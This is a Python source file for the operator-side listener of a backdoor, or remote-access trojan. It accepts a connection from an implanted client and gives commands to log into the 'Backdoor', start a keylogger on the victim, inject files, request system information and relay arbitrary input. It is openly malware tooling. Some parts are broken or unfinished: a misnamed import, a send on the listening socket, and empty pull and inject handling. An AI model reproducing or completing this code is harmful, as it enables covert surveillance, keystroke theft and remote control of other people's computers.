import socket, json, os, subprocesses
from psftp import *
def recieve(s, buff=1024):
	data = b''
	while True:
		packet = s.recv(buff)
		data += packet
		if len(packet) < buff:
			break
	return data
def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)

srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
	with open('../SETTINGS.json', 'r') as file: settings = json.load(file) # load settings

	ip = socket.gethostname() # configure network variables
	port = settings['port']

	print('\n\n - Use \'@HELP\' or \'::?\' for a list of commands.')
	print(' - Use \'@GO\' or \'::!\' to start listening for connections.')
	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program\n\n')

	while True:
		usrin = input('>> ')
		if usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
			with open('cfg/help.txt', 'r') as file: print(file.read())
			continue
		elif usrin.find('@GO') == 0 or usrin.find('::!') == 0: break
		else: continue

	srvr.bind((ip, port))
	srvr.listen()
	client, addr = srvr.accept() # establish connection
	print(f'Connection from {addr} has been established...')

	while True:

		data = recieve(client) # decode recieve data
		msg = data.decode()

		if msg == '@LOGIN':
			while True:
				login = input('Login: ') # login
				data = bytes(login, 'utf-8')
				client.send(data)

				data = recieve(client) # decode recieve data
				msg = data.decode()

				if msg == '@CONNECTED': # confirm connection
					print('Connected to Backdoor...')
					client.send(b'@CONFIRM-CONNECTION')
					break

				else: continue

			continue

		elif msg.find('@GET-INPUT ') == 0:
			usrin = input(msg[11:])

			if usrin.replace(' ', '') == '@KEYLOG' or usrin.replace(' ', '') == '::k': # start keylogger
				srvr.send(b'@START-KL')
				continue

			elif usrin.replace(' ', '') == '@TERMINATE' or usrin.replace(' ', '') == '::t': os._exit(0) # terminate listener

			elif usrin.find('@HELP') == 0 or usrin.find('::?') == 0: # help menu
				with open('cfg/help.txt', 'r') as file: print(file.read())
				client.send(b'@RESEND')
				continue

			elif usrin.find('@INJECT') == 0 or usrin.find('::i') == 0: # inject file
				msg = usrin.replace('@INJECT ', '')
				ifilepath = msg.replace('::i ', '')
				quoteindex = 0
				index = 0
				for i in ifilepath:
					if i == '"': quoteindex += 1
					if quoteindex == 2:
						index += 1
						dfilepath = ifilepath[index+1:]
						ifilepath = ifilepath[:index]
						break
					index += 1
				del quoteindex
				del index

			elif usrin.find('@PULL') == 0 or usrin.find('::p') == 0:
				pass

			elif usrin == '@SYSTEM' or usrin == '::s':
				client.send(b'@GET-SYSTEM')
				continue

			else: # ordinary packet
				data = bytes(usrin, 'utf-8')
				client.send(data)
				continue

		else:
			print(msg)
			continue

	settings['new-log'] = True # reset log status
	with open('../SETTINGS.json', 'w') as file: json.dump(settings, file, indent=4)